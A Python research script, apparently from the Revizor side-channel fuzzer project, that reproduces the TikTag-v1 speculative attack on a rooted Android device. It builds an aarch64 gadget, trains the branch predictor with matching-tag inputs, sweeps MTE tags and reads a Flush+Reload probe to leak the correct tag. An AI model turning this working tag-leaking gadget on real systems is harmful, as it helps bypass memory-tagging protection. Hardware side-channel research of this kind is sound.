"""Test the cross-input training hypothesis: split the TikTag-v1 training schedule across a BATCH of
executor inputs instead of an internal loop. K training inputs make the forward branch fall through
(slow=1) with the genuine (matching) tag, training the predictor not-taken; one attack input flips the
branch (slow=0) with a swept tag and is speculated. The batch runs in one TRACE with no flush between
inputs (NI cross-input regime), so the training carries into the attack. We measure ONLY the attack
input's probe set, sweeping its tag. If the matching tag separates, cross-input training reproduces v1
-- the basis for a fuzzer improvement (a genuine-tag training prefix before a decoy attack)."""
import sys, re, subprocess, os
REPO = "/home/gal_k_1_1998/revizor/sca-fuzzer"
sys.path.insert(0, REPO)
from src.config import CONF
CONF.load(os.path.join(REPO, "config_g1_x3.yml"))
from src.interfaces import Input
from src.aarch64.aarch64_executor_input_encoder import ExecutorInput
from ppadb.client import Client

OUT = "/tmp/claude-1000/-home-gal-k-1-1998-revizor-sca-fuzzer/cf5e0fed-2c4e-46af-8f5e-49fcf726976a/scratchpad"
COMPILE = os.path.join(REPO, "src/executor_userland/asm_compiler/compile_test_case.py")
PY = "/home/gal_k_1_1998/revizor/revizor-venv/bin/python"
T = 5
READ_SET = 32
WARM_SET = 48
LDNUM = 16
GAP = 80
K = 64              # genuine-tag training inputs before the attack
N = 30              # TRACE+measure repeats per swept tag
EU = "/data/local/tmp/executor_userland /dev/executor"
DEV = "/data/local/tmp"

d = Client('127.0.0.1', 5037).devices()[0]


def su(c):
    return d.shell(f"su -c '{c}'")


MAIN = int(su("cat /sys/executor/print_sandbox_base").strip(), 16)


def gadget_asm(ldnum, gap):
    L = ["ldr x12, [x4]",            # warm guess granule via unchecked-tag-15 alias (never faults)
         "dc civac, x0", "dc civac, x2", "dsb sy", "isb",
         "ldr x8, [x0]",             # slow load: training=1 (fall through), attack=0 (taken)
         "cbz x8, .Lskip"]           # not-taken on training (body arch), taken on attack (body spec)
    L += ["ldr x9, [x1]"] * ldnum    # tag-checked guess load(s); x1 match on training, swept on attack
    L += ["orr x6, xzr, xzr"]        # x6 = 0 (register)
    L += ["orr x2, x2, x6"] * gap    # serial latency chain on the probe address (value-stable)
    L += ["ldr x11, [x2]", ".Lskip:"]
    return "\n".join(L) + "\n"


def build_tc():
    asm = f"{OUT}/g1_bt.asm"; binf = f"{OUT}/g1_bt.bin"
    open(asm, "w").write(gadget_asm(LDNUM, GAP))
    r = subprocess.run([PY, COMPILE, "--input", asm, "--output", binf], capture_output=True)
    if r.returncode:
        print(r.stderr.decode()); sys.exit(1)
    return binf


def train_input():
    inp = Input(1); inp.view('uint64')[:] = 0
    g = inp[0]['gpr']
    g[0] = MAIN + 0x400                              # cond ptr; mem there = 1 -> branch falls through
    inp[0]['main'][0x400 // 8] = 1                   # slow value = 1 (training)
    g[1] = (MAIN & ~(0xF << 56)) | (T << 56)         # guess ptr, MATCH tag
    g[2] = MAIN + WARM_SET * 64                      # probe -> throwaway warm set
    g[4] = (MAIN & ~(0xF << 56)) | (15 << 56)        # unchecked-15 warm alias
    t = [15] * 512; t[0] = T
    return ExecutorInput(input_=inp, mte_tags=t).serialize()


def attack_input(G):
    inp = Input(1); inp.view('uint64')[:] = 0
    g = inp[0]['gpr']
    g[0] = MAIN + 0x400                              # cond ptr; mem there = 0 -> branch taken (mispredict)
    g[1] = (MAIN & ~(0xF << 56)) | (G << 56)         # guess ptr, SWEPT tag
    g[2] = MAIN + READ_SET * 64                      # probe -> read set
    g[4] = (MAIN & ~(0xF << 56)) | (15 << 56)
    t = [15] * 512; t[0] = T
    return ExecutorInput(input_=inp, mte_tags=t).serialize()


binf = build_tc()
d.push(binf, binf.replace(OUT, DEV)); su(f"chmod 666 {binf.replace(OUT, DEV)}")
open(f"{OUT}/g1_train.reif", "wb").write(train_input())
d.push(f"{OUT}/g1_train.reif", f"{DEV}/g1_train.reif")
for G in range(16):
    open(f"{OUT}/g1_atk{G}.reif", "wb").write(attack_input(G))
    d.push(f"{OUT}/g1_atk{G}.reif", f"{DEV}/g1_atk{G}.reif")
su(f"chmod 666 {DEV}/g1_*.reif")

# NI cross-input regime but PINNED to X3 (v1 is X3-only)
for k, v in (("measurement_mode", "F+R"), ("pin_to_core", "8"), ("warmups", "0"),
             ("enable_pre_run_flush", "0"), ("enable_phr_flush", "0"),
             ("enable_view_rotation", "0"), ("enable_ssbs", "0")):
    su(f"echo {v} > /sys/executor/{k}")
su(f"{EU} 1 >/dev/null; {EU} w {binf.replace(OUT, DEV)} >/dev/null")

idx = 63 - READ_SET
print(f"MAIN={hex(MAIN)} T={T} read set={READ_SET} K-train={K} ldnum={LDNUM} gap={GAP} reps={N} core=8")


def load_batch(G):
    # fresh batch: K training inputs (ids 0..K-1) then the attack input (id K), attack id returned
    su(f"{EU} 9 >/dev/null")
    atk_id = None
    for j in range(K + 1):
        iid = re.search(r"Allocated Input ID:\s*(\d+)", su(f"{EU} 5")).group(1)
        reif = f"{DEV}/g1_train.reif" if j < K else f"{DEV}/g1_atk{G}.reif"
        su(f"{EU} 4 {iid} >/dev/null; {EU} w {reif} >/dev/null")
        atk_id = iid
    return atk_id


def htrace_bit(o, bit):
    m = re.search(r"htrace 0:\s*([01]{64})", o)
    return int(m.group(1)[63 - bit]) if m else None


res = {}
for G in range(16):
    atk_id = load_batch(G)
    hits = 0
    for _ in range(N):
        su(f"{EU} 8 >/dev/null")                                  # TRACE whole batch (train then attack)
        b = htrace_bit(su(f"{EU} 4 {atk_id} >/dev/null; {EU} 7"), READ_SET)
        if b is not None:
            hits += b
    res[G] = hits / N
    print(f"{G:2d} {'MATCH ' if G == T else 'mismis'} {res[G]:.2f}", flush=True)

mm = [res[g] for g in range(16) if g != T and g != 15]
sep = res[T] - max(mm)
print(f"\nMATCH(T={T})={res[T]:.2f}  checked-mismatch max={max(mm):.2f} mean={sum(mm)/len(mm):.2f}"
      f"  sep={sep:+.2f}  {'*** cross-input training REPRODUCES v1 ***' if sep > 0.15 else 'no separation'}")
